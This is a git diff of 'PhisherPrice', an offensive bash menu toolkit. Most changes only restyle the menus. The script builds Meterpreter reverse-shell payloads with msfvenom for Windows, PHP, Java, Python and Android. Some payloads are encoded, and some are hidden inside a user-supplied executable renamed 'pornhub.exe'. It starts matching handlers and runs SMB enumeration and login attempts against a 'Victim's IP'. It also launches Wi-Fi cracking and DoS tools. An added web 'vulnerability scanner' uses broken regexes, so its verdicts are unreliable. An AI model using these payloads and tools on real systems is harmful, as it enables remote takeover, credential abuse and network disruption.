         msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/pwnd.exe
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.exe!
+!Your payload: ${green}/root/Desktop/pwnd.exe${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       8)
       clear
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > /root/Desktop/pwnd.exe
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.exe!
+!Your payload: ${green}/root/Desktop/pwnd.exe${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       9)
       clear
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f asp > /root/Desktop/pwnd.asp
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.asp!
+!Your payload: ${green}/root/Desktop/pwnd.asp${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       10)
       clear
 msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.py
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.py!
+!Your payload: ${green}/root/Desktop/pwnd.py${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       11)
       clear
 msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/pwnd.jar
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.jar!
+!Your payload: ${green}/root/Desktop/pwnd.jar${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       12)
       clear
 msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/bind.macho!
+!Your payload: ${green}/root/Desktop/bind.macho${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       13)
       clear
 msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f raw > /root/Desktop/pwnd.jsp
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.jsp!
+!Your payload: ${green}/root/Desktop/pwnd.jsp${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       14)
       clear
 msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.php
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.php!
+!Your payload: ${green}/root/Desktop/pwnd.php${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
@@ -2399,7 +2375,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/revers
 msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/bind.macho!
+!Your payload: ${green}/root/Desktop/bind.macho${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
@@ -2412,13 +2388,13 @@ msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/re
 echo "your .exe location:"
 read -e exelocation
 msfvenom -x $exelocation -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pornhub.exe
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pornhub.exe!
+!Your payload: ${green}/root/Desktop/pornhub.exe${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
@@ -2427,26 +2403,26 @@ msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/re
 echo "your .exe location:"
 read -e bindexelocation
 msfvenom -x $bindexelocation -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pornhub.exe!
+!Your payload: ${green}/root/Desktop/pornhub.exe${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
       18)
       clear
 msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
-echo -e '
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.apk!
+!Your payload: ${green}/root/Desktop/pwnd.apk${reset}!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
-'
+"
 
 msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
         ;;
@@ -2455,7 +2431,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/re
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -2471,94 +2447,248 @@ scannersmenu() {
   while true
   do
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Auto Scanners
-\e[3;39m
-(1) Test Target If They are Vulnerable To (ms17_010)
-(2) Determine Named Pipes Over SMB (pipe_auditor)
-(3) Discover DCERPC Services (pipe_dcerpc_auditor)
-(4) Scans Host & determines If They Support SMB2
-(5) Enumerate The Users On The System (smb_enumusers)
-(6) Attempt To Login Via SMB (smb_login)
-(7) Brute-forces SID Lookups to determine what local users exist the system (SMB_LOOKUPSID)
-(8) determine The Version Of The SMB Service That Is Running (smb_version)
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Scanners$Blue]:"
-read -r -p" └─────► " choice
+	
+echo -e "
+┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│${red}Auto Scanners${reset}                                                                                       │
+├────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│${green}1${reset} │Test Target If They are Vulnerable To (ms17_010)                                                 │
+│${green}2${reset} │Determine Named Pipes Over SMB (pipe_auditor)                                                    │
+│${green}3${reset} │Discover DCERPC Services (pipe_dcerpc_auditor)                                                   │
+│${green}4${reset} │Scans Host & determines If They Support SMB2                                                     │
+│${green}5${reset} │Enumerate The Users On The System (smb_enumusers)                                                │
+│${green}6${reset} │Attempt To Login Via SMB (smb_login)                                                             │
+│${green}7${reset} │Brute-forces SID Lookups to determine what local users exist the system (SMB_LOOKUPSID)          │
+│${green}8${reset} │Determine The Version Of The SMB Service That Is Running (smb_version)                           │
+│${green}9${reset} │Web App Vuln Scanner [ BETA ]                                                                    │
+├────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit                                                                 │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Scanners$blue]:"$reset────────────────────────────────────────────────────────────────────┘"
+read -r -p"└─────► $reset" choice
 
     case $choice in
       1)
         clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
         ;;
       2)
 clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/pipe_auditor; set rhosts $r ; exploit ;exit ;"
         ;;
       3)
 clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/pipe_dcerpc_auditor; set rhosts $r ; exploit ;exit ;"
         ;;
       4)
 clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb2; set rhosts $r ; exploit ;exit ;"
         ;;
       5)
 clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_enumusers; set rhosts $r ; exploit ;exit ;"
         ;;
       6)
 clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 echo "Victim's Password:"
-read -e passmb
+read -e passmb && echo "$passmb" >> ~/.bash_history 2>/dev/null
 echo "Victim's User Account:"
-read -e accsmb
+read -e accsmb && echo "$accsmb" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_login; set rhosts $r ; set SMBPass $passmb ; set SMBUser $accsmb ; exploit ;exit ;"
         ;;
       7)
 clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_lookupsid; set rhosts $r ; exploit ;exit ;"
         ;;
       8)
 clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_version; set rhosts $r ; exploit ;exit ;"
+        ;;
+      9)
+      clear
+echo "Common Web Application Vulnerability Scanner [${green}BASH${reset} \ ${yellow}BETA${reset}]"
+echo ""
+# Read input from user and store in history file
+read -e -p "Enter URL or IP address to scan: " url && echo "$url" >> ~/.bash_history 2>/dev/null
+
+# Set variables
+search_query=$(echo "$url"| sed 's#[/:]#\\#g') # escape forward slashes for regex
+
+# Truncate search query if it exceeds maximum length
+# This is done to limit the length of the search query that is displayed to the user and to prevent it from becoming too long and difficult to read or fit on the screen.
+max_length=40
+if (( ${#search_query} > $max_length )); then
+    truncated_query=$(echo "${search_query:0:$max_length}...")
+else
+    truncated_query=$search_query
+fi
+
+# Print output
+printf "\n\n${green}Host: %s\n" "${reset}$url"
+
+# Check if input is a valid URL or IP address
+if ! [[ $url =~ ^(([0-9]{1,3}\.){3}[0-9]{1,3})|([a-zA-Z]+://.*)$ ]]; then
+    printf "${red}Error:${reset} Invalid URL or IP address entered.\n"
+fi
+# Set cURL options to verify SSL certificate
+user_agents_file="./main/user_agents.txt"
+user_agents=()
+while read -r line; do
+    user_agents+=("$line")
+done < "$user_agents_file"
+selected_user_agent=${user_agents[RANDOM % ${#user_agents[@]}]}
+echo "$green Using user agent:$reset $selected_user_agent"
+echo ""
+curl_options=(
+    --silent
+    --show-error
+    --max-time 10
+    --insecure
+    --user-agent "$selected_user_agent"
+)
+output=$(curl "${curl_options[@]}" "$url")
+http_code=$(curl -o /dev/null -s -w "%{http_code}\n" "${curl_options[@]}" "$url")
+    # Check if SSL certificate is valid
+  if (( http_code == 0 )); then
+    printf "${red}Error:${reset} Unable to connect to URL or IP address.\n"
+  elif (( http_code == 200 )); then
+    # Array of regular expressions that match common web application vulnerabilities and their brief descriptions
+    declare -A vulnerabilities=(
+    ["SQL Injection"]="/'.*\\$/i" 
+    # Malicious SQL code is inserted into an application's input and executed by the database.
+    ["XSS"]="/<script>alert\\('XSS'\\);<\\/script>/i"
+    # Malicious scripts are injected into a web page and executed by unsuspecting users.
+    ["File Inclusion"]="/(include|require)(_once)?[\\s]*(\\(|[\"'])[\\s]*([A-Za-z0-9_]+)(\\.[A-Za-z]+)?([\"']|\\))/i"
+    # Unsanitized user input is used to load a file or resource that should not be publicly accessible.
+    ["Directory Traversal"]="/\.\.[\/\\\]/i"
+    # User input is used to navigate to directories outside of the intended directory hierarchy.
+    ["Remote File Inclusion"]="/(include|require)(_once)?[\s]*[\(\"']http(s)?:\/\/(.*)[\)\"']/i"
+    # Malicious code is included from a remote server allowing an attacker to execute code on the server.
+    ["Command Injection"]="/;.*;/i"
+    # User input is passed directly to the command line allowing an attacker to execute arbitrary commands.
+    ["Cross-Site Request Forgery (CSRF)"]="/<form.*action=[\"'](?!\s*https?:\/\/".$_SERVER['HTTP_HOST'].")[^\"']*\"/i"
+    # An attacker submits unauthorized requests on behalf of an authenticated user.
+    ["Unrestricted File Upload"]="/(jpg|jpeg|png|gif|svg|pdf|doc|docx|xls|xlsx|ppt|pptx|csv|txt)[\s]*$/i"
+    # Malicious files are uploaded to a server and executed allowing an attacker to execute code on the server.
+    ["Password Cracking"]="/\bpassword\b|\bpwd\b|\bpasscode\b|\bpin\b/i"
+    # Weak password policies allow attackers to guess or crack passwords.
+    ["Session Hijacking"]="/document\.cookie/i" #nst
+    # An attacker gains access to a user's session ID and uses it to impersonate the user.
+    ["Broken Auth and Session Management"]="/PHPSESSID|session_id|JSESSIONID/i"
+    # Poorly implemented authentication and session management allow attackers to bypass authentication and hijack sessions.
+    ["Remote Code Execution"]="/eval|exec|passthru|shell_exec|system|popen|pcntl_exec|proc_open/i"
+    # User input is passed directly to the command line allowing an attacker to execute arbitrary commands.
+    ["Local File Inclusion"]="/(include|require)(_once)?[\s]*(\(|[\"'])\.\.\/(.*)([\"']|\))/i"
+    # Unsanitized user input is used to load a file or resource that should not be publicly accessible.
+    ["Server Side Request Forgery (SSRF)"]="/curl|file_get_contents|fsockopen|pfsockopen|fopen|readfile|pop|imap|smtp|socket|ftp_(connect|login)|mysql_(connect|pconnect)/i" #sc@nst
+    # An attacker sends requests to internal or external servers on behalf of the vulnerable application.
+    ["XML External Entity (XXE) Injection"]="/<!ENTITY.*SYSTEM.*>/i"
+    # An attack where external entities are injected into an XML document leading to the disclosure of sensitive information or execution of remote code.
+    ["Cross-Site Script Inclusion (XSSI)"]="/[a-zA-Z0-9_]+\s*=\s*\[\s*\{.*\"/i"
+    # An attack where an attacker can load a web page's JavaScript data from an external source allowing them to execute malicious code on the victim's browser.
+    ["Server-Side Template Injection (SSTI)"]="/\{\{.*\}\}/i"
+    # An attack where an attacker injects malicious code into a template that is parsed and executed on the server-side.
+    ["HTML Injection"]="/<\s*script\s*>.*<\s*\/script\s*>/i" #scns
+    # This is a vulnerability where an attacker can inject malicious HTML code into a web page. This can allow the attacker to steal sensitive information or execute arbitrary code in the user's browser.
+    ["LDAP Injection"]="/[\|&;\$><\(\)]/i"
+    # An attack where an attacker can inject malicious input into an LDAP search filter or command allowing them to access or modify sensitive information in the LDAP directory.
+    ["XPath Injection"]="/'[^\']*'/i"
+    # An attack where an attacker injects malicious input into an XPath query allowing them to access or modify sensitive information.
+    ["Code Injection"]="/{{.*\..*}}|{{.*\|.*system.*}}|{{.*\|.*passthru.*}}/i"
+    # An attack where an attacker can inject malicious code into a web application allowing them to execute arbitrary code on the server.
+    ["Object Injection"]="/unserialize|__wakeup|__destruct/i"
+    # An attack where an attacker can manipulate serialized objects in a web application to execute arbitrary code.
+    ["Cross-Domain Scripting"]="/<script.*src=[\"'](?!https?:\/\/".$_SERVER['HTTP_HOST'].")[^\"']*\"/i"
+    # An attack where an attacker can inject a script into a web page from an external domain allowing them to steal sensitive information from the victim's browser.
+    ["HTTP Response Splitting"]="/\r\n|\n|\r/i"
+    # An attack where an attacker can insert additional HTTP headers into a response allowing them to manipulate the behavior of the web application or perform phishing attacks.
+    ["Buffer Overflow"]="/%s|%x|%n|%h|%p|%s|%u|%hn|%hhn|%lx|%lX|%llX/i"
+    # An attack where an attacker can exploit a buffer overflow vulnerability in a web application to execute arbitrary code on the server.
+    ["Format String Attack"]="/%n|%s|%p|%x|%d|%i|%o|%u|%e|%c|%f|%g|%h|%n|%hhn|%hn|%ln|%lln/i"
+    # An attack where an attacker can exploit a format string vulnerability in a web application to execute arbitrary code on the server.
+    ["Command Injection (Windows)"]="/\b(com|exe|bat|cmd)(\s*\/c|\s+\-c|\s+\-command|\s+\/k|\s+\-k|\s+\-batch|\s+\/b)\b/i"
+    # An attack where an attacker can inject malicious input into a command executed on a Windows system allowing them to execute arbitrary code on the server.
+    ["Insecure Cryptographic Storage"]="/(md5|sha1|sha256|sha384|sha512|crypt)\b/i"
+    # An attack where an attacker can exploit weak cryptographic hashing algorithms to gain access to sensitive information.
+    ["Insecure Direct Object References"]="/\/(users|accounts|orders)\/\d+/i"
+    # Unvalidated or insufficiently validated user input is used to access sensitive information or functionality directly through URL manipulation.
+    ["Insufficient Logging and Monitoring"]="/error_log\(|trigger_error\(|Exception|ERROR/i"
+    # Insufficient or nonexistent logging and monitoring capabilities make it difficult to detect and respond to security incidents.
+    ["Security Misconfiguration"]="/(phpinfo|display_errors|allow_url_include)\b/i"
+    # Incorrectly configured server settings or application properties can result in vulnerabilities that can be exploited by attackers.
+    ["Cross-Site Script Inclusion (CSSI)"]="/<link.*href=[\"'](?!\s*https?:\/\/".$_SERVER['HTTP_HOST'].")[^\"']*\"/i"
+    # Unsanitized user input is used to include external resources such as stylesheets that could potentially be controlled by an attacker.
+    ["Click Fraud"]="/(pay per click fraud|click fraud|ppc fraud|clickbot|click-spam|click spam|ad fraud)/i"
+    # An attack where an attacker generates fake clicks on online advertisements to increase their revenue or to exhaust a competitor's advertising budget."
+    ["Broken Access Control"]="/(path traversal|directory traversal|unauthorized access|access control|forceful browsing|privilege escalation|authorization bypass|insecure direct object reference|IDOR|access control matrix)/i"
+    # An attack where an attacker is able to gain unauthorized access to resources or actions that should be protected by access controls allowing them to steal sensitive information or perform malicious actions.
+    ["Clickjacking"]="/(clickjacking|UI redressing|UI redress attack|user interface redressing|user interface redress attack|UI overlay attack|overlay attack)/i" #root@nst
+    # An attack where an attacker tricks a user into clicking on a button or link that is disguised as something else such as a harmless button but actually performs a malicious action such as initiating a transfer of funds or installing malware.
+    ["Hidden Form Fields"]="/<input\s+type\s*=\s*[\"']?\s*hidden\s*[\"']?\s*>/i"
+    # This is a type of vulnerability where a form field is hidden from the user but still included in the form submission. This can allow attackers to submit unexpected data potentially bypassing form validation or performing other malicious actions.
+    ["Shellshock"]="/(bash( |%20|\\+|%2[Bb])?-c|\$\(printf|echo -ne|wget.*\?cmd=|curl.*\?data=.*bash|User-Agent:.*[\(\)\{\};\'\"\\\`\$][\(\)\{\};\'\"\\\`\$]|shellshock)/i"
+    # Shellshock is a security vulnerability in the Unix Bash shell that was discovered in 2014. It allows an attacker to execute arbitrary code on a target system by exploiting a flaw in how Bash evaluates environment variables. The vulnerability affects many versions of Bash on Unix-based operating systems, including Linux and Mac OS X. It can be used to launch a variety of attacks, including remote code execution, privilege escalation, and data theft. The vulnerability has been patched, but it remains a risk for systems that have not been updated.   
+    #
+    ###################
+    # LEAVE ME INTACT #
+    ###################
+    #   RJWDLY4EVA    #
+    ###################
+    #
+    # //ADD FROM HERE
+    # Feel Free To Add More
+    )
+    
+    # Scan for vulnerabilities
+    found_vulns=()
+    for name in "${!vulnerabilities[@]}"; do
+        if [[ $output =~ ${vulnerabilities[$name]} ]]; then
+            found_vulns+=("$name:${green} Vulnerable${reset}")
+        else
+            found_vulns+=("$name:${red} Not Vulnerable${reset}")
+        fi
+    done
+
+    # Output vulnerability scan results in a table
+    printf "${cyan}Vulnerability Scan Results:${reset}\n\n"
+    printf "%-50s %s\n" "${yellow}Vulnerability"           "${yellow} Status${reset}"
+    for vuln in "${found_vulns[@]}"; do
+        printf "%-40s %s\n" "${vuln%%:*}" "${vuln#*:}"
+    done
+    printf "\n"
+else
+    printf "${red}Error:${reset} HTTP ${yellow}$http_code ${reset} returned from URL or IP address.\n"
+fi
         ;;
       b|B)
         return
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -2574,68 +2704,56 @@ submenu4() {
   while true
   do
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Networking
-\e[3;39m
-(1) Stealth ARP Scan
-(2) Passive ARP Scan
-(3) Cisco Routers
-(4) MasScan (Find Open Ports/Ips)
-(5) Start Wifite
-(6) Start Yersinia
-(7) Bully
-(8) Start Fern (Wifi Cracker)
-(9) Start Eassid-ng (Buddy-ng)
-(10) Start Kismet
-(11) Wi-Fi HoneyPot
-(12) DoS Toolkit
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
-read -r -p" └─────► " choice
+echo -e "
+┌────────────────────────────────────────────┐
+│${red}Networking${reset}                                  │
+├────────────────────────────────────────────┤
+│${green}1${reset}  │ARP Scan                                │
+│${green}2${reset}  │Host Info Gathering with netdiscover    │
+│${green}3${reset}  │Cisco Routers                           │
+│${green}4${reset}  │MasScan (Find Open Ports/Ips)           │
+│${green}5${reset}  │Start Wifite                            │
+│${green}6${reset}  │Start Yersinia                          │
+│${green}7${reset}  │Bully                                   │
+│${green}8${reset}  │Start Fern (Wifi Cracker)               │
+│${green}9${reset}  │Start Eassid-ng (Buddy-ng)              │
+│${green}10${reset} │Start Kismet                            │
+│${green}11${reset} │Wi-Fi HoneyPot                          │
+│${green}12${reset} │DoS Toolkit                             │
+├────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit         │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Networking$blue]:"$reset──────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
       clear
-echo -e "\nNetwork Scanning with arp-scan"
+echo -e "\n${yellow}Network Scanning with arp-scan${reset}"
 echo -e "-------------------------------------------\n"
 
-echo "Example IP Usage: 192.168.9.99"
+echo "${cyan}Example IP Usage:${yellow} 192.168.9.99${reset}"
 echo "Enter the IP address to scan: " 
-read subopa
+read subopa && echo "$subopa" >> ~/.bash_history 2>/dev/null
 
 echo -e "\nStarting network scan...\n"
 
 if arp-scan -l -s $subopa -v; then
-    echo -e "\nNetwork scan complete.\n"
+    echo -e "\nNetwork scan ${green}complete.${reset}\n"
 else
-    echo -e "\nNetwork scan failed.\n"
+    echo -e "\nNetwork scan ${red}failed.${reset}\n"
 fi
         ;;
       2)
         clear
-echo -e '\e[1;33m
-   _____ ____________________    _________      .__  _____  _____             
-  /  _  \\______   \______   \  /   _____/ ____ |__|/ ____\/ ____\___________ 
- /  /_\  \|       _/|     ___/  \_____  \ /    \|  \   __\\   __\/ __ \_  __ \
-/    |    \    |   \|    |      /        \   |  \  ||  |   |  | \  ___/|  | \/
-\____|__  /____|_  /|____|     /_______  /___|  /__||__|   |__|  \___  >__|   
-        \/       \/                    \/     \/                     \/       \e[1;34m
-'
-echo -e "\nHost Information Gathering with netdiscover"
+echo -e "\n${yellow}Host Information Gathering with netdiscover${reset}"
 echo -e "-------------------------------------------\n"
 
-echo -e "Starting information gathering...\n"
+echo -e "${green}Starting${reset} information gathering...\n"
 
 clear
 if netdiscover -p; then
-  echo -e "\nInformation gathering complete.\n"
+  echo -e "\nInformation gathering ${green}complete.${reset}\n"
 else
-  echo -e "\nInformation gathering failed.\n"
+  echo -e "\nInformation gathering ${red}failed.${reset}\n"
 fi
         ;;
       3)
@@ -2643,36 +2761,28 @@ fi
         ;;
       4)
         clear
-echo -e '\e[1;33m
-   _____                  _________                     
-  /     \ _____    ______/   _____/ ____ _____    ____  
- /  \ /  \\__  \  /  ___/\_____  \_/ ___\\__  \  /    \ 
-/    Y    \/ __ \_\___ \ /        \  \___ / __ \|   |  \
-\____|__  (____  /____  >_______  /\___  >____  /___|  /
-        \/     \/     \/        \/     \/     \/     \/ \e[1;34m
-'  
-echo -e "\nNetwork Port Scanner with Masscan"
+echo -e "\n${yellow}Network Port Scanner with Masscan${reset}"
 echo -e "---------------------------------\n"
 echo "Enter IP (e.g. 192.168.1.0):"
-read massip
+read massip && echo "$massip" >> ~/.bash_history 2>/dev/null
 echo "Enter Port Range (e.g. 24 or 80):"
 read massrange
 
 clear
 
-echo -e "Starting port scan...\n"
+echo -e "${green}Starting${reset} port scan...\n"
 
 if masscan -p22,21,80,445,443 $massip/$massrange; then
-  echo -e "\nPort scan complete.\n"
+  echo -e "\nPort scan ${green}complete.${reset}\n"
 else
   clear
-  echo -e "\nPort scan failed.\n"
+  echo -e "\nPort scan ${red}failed.${reset}\n"
 fi
         ;;
       5)
         clear
 echo -e "\n**************************************************"
-echo "******     Wifite Launcher     ******"
+echo "******     ${cyan}Wifite ${reset}Launcher     ******"
 echo -e "**************************************************\n"
 
 read -p "Are you sure you want to start Wifite? (y/n): " wifiwanger
@@ -2680,21 +2790,21 @@ read -p "Are you sure you want to start Wifite? (y/n): " wifiwanger
 if [[ $wifiwanger =~ ^[Yy]$ ]]; then
   clear
   echo -e "\n**************************************************"
-  echo "******     Starting Wifite     ******"
+  echo "******     ${green}Starting${reset} Wifite     ******"
   echo -e "**************************************************\n"
   
   wifite --kill-all
 else
   clear
   echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
+  echo "******     ${red}Operation cancelled${reset}     ******"
   echo -e "**************************************************\n"
 fi
         ;;
       6)
         clear
 echo -e "\n**************************************************"
-echo "******     Yersinia Launcher     ******"
+echo "******     ${cyan}Yersinia${reset} Launcher     ******"
 echo -e "**************************************************\n"
 
 read -p "Are you sure you want to start Yersinia? (y/n): " siryessir
@@ -2702,21 +2812,21 @@ read -p "Are you sure you want to start Yersinia? (y/n): " siryessir
 if [[ $siryessir =~ ^[Yy]$ ]]; then
   clear
   echo -e "\n**************************************************"
-  echo "******     Starting Yersinia     ******"
+  echo "******     ${green}Starting${reset} Yersinia     ******"
   echo -e "**************************************************\n"
 
   yersinia -G
 else
   clear
   echo -e "\n**************************************************"
-  echo "******     Operation cancelled     ******"
+  echo "******     ${red}Operation cancelled${reset}     ******"
   echo -e "**************************************************\n"
 fi
         ;;
       7)
         clear
 echo -e "\n**************************************************"
-echo "******     Wi-Fi Bully     ******"
+echo "******     ${cyan}Wi-Fi Bully${reset}     ******"
 echo -e "**************************************************\n"
 
 read -p "Enter the ESSID of the network you want to bully (e.g. 6F36E6): " essid
@@ -2733,31 +2843,31 @@ fi
 
 read -p "Are you sure you want to bully network with ESSID $essid using interface $interface? (y/n): " confirm
 if [[ ! $confirm =~ ^[Yy]$ ]]; then
-  echo -e "\nOperation cancelled."
+  echo -e "\nOperation ${red}cancelled.${reset}"
   read -p "Press Enter to continue."
 fi
 
 clear
 echo -e "\n**************************************************"
-echo "******     Starting Bully     ******"
+echo "******     ${green}Starting${reset} Bully     ******"
 echo -e "**************************************************\n"
 bully -e $essid $interface
 
 if [[ $? -ne 0 ]]; then
   clear
